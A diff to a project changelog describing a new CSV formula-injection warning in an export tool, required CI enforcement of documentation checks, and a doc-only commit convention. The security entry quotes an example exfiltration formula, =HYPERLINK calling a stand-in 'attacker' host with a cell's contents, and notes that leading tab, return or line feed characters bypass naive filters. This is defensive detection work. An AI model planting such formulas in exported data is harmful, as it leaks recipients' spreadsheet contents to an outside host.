@@ -7,6 +7,36 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Added
+
+- **`export_table_csv` now warns when an export holds values a spreadsheet would execute.** A CSV
+  field beginning with `=`, `+`, `-` or `@` — including one that only does so once a leading tab,
+  carriage return or line feed is stripped — is evaluated as a **formula** rather than data when the
+  file is opened in Excel, LibreOffice Calc or Google Sheets. A stored
+  `=HYPERLINK("http://attacker/?"&A1)` therefore executes in the recipient's spreadsheet, and the
+  value never has to be malicious in the database, only rendered, which puts every column a user can
+  influence in scope. When such cells are present the response now carries a second text block
+  naming the count, introduced by `--- end of CSV data ---` so the boundary survives a client that
+  joins content blocks into one string.
+
+  **The exported bytes are unchanged, deliberately.** The usual mitigation — prefixing risky values
+  with an apostrophe — was rejected: an export that quietly turns `-1` into `'-1` is lying about the
+  data, and for a pipeline, another database or `pandas.read_csv` that mitigation would be the bug.
+  An opt-in `spreadsheet_safe` parameter was rejected too, because it assumes the caller knows where
+  the file is going. The caller here is a model choosing arguments from natural language, and the
+  user commonly decides to open the result in a spreadsheet only after reading it — so the flag
+  would be set at the one moment the destination is unknowable. Warning removes the need for that
+  foresight: the caller is told the payload is there.
+
+  **Ordinary negative numbers do not trigger it.** `mssql` returns INT and DECIMAL columns as JS
+  numbers, so a naive leading-character test flags every negative figure on a ledger, variance or
+  temperature column — and an alarm that fires on ordinary data is one its reader learns to skip.
+  Strict numeric literals are exempt, which is sound because no string is both a valid number and a
+  formula: `-1` and `-1.5e3` are exempt while `-1+1` is not. Tab, carriage return and line feed are
+  treated as a wrapper to strip rather than as triggers in their own right, since the danger is that
+  a reader discards them and is left holding a formula — which is also what makes them a bypass of a
+  naive first-character filter. Closes #1245.
+
 ### Changed
 
 - **The logger no longer guesses whether it is talking to an MCP client — it never had to.** This
@@ -27,6 +57,26 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   more.** Setting them is now a harmless no-op; no client or user configuration needs changing.
   Development-format log lines are also no longer colorized, since the colorized variant was only
   ever selected by the detection that is gone.
+
+- **Documentation drift now blocks a merge instead of merely reporting one.** The orphan-doc and
+  environment-variable doc-sync checks added in #1254 ran only in the `Validate Documentation`
+  workflow, which is not a required status check — so a pull request that orphaned a doc or drifted
+  `docs/reference/ENV-VARS.md` turned that job red and merged anyway, which is the exact failure the
+  checks were built to prevent. `npm run docs:check` had no other caller either: it sits in
+  `npm run ci`, which no workflow invokes, and in neither git hook. Enforcement now runs in the
+  `Code Quality & Linting` job, which is required and carries no path filter, so it cannot be
+  skipped for any changed path. Both checks stay in `Validate Documentation` as
+  `continue-on-error: true`, because that job's `link-report.md` is what says _what_ drifted where
+  the required check only says _that_ it did — and promoting the whole job instead would have made
+  its link checker blocking, and that checker 404s on still-private GHSA advisories during a
+  security release. Closes #1252.
+
+- **`CONTRIBUTING.md` now states the doc-only commit convention**, carried over unresolved from #97:
+  a change touching only documentation belongs in its own `docs:` commit rather than folded into a
+  neighbouring code or infra commit. The section is explicit about what this does not buy — it does
+  not change the release type, since `docs:`, `ci:` and `fix:` all classify as patch — and about
+  what it does not ask for: separate commits within a pull request, not separate pull requests, and
+  no check enforces it.
 
 ### Removed
 
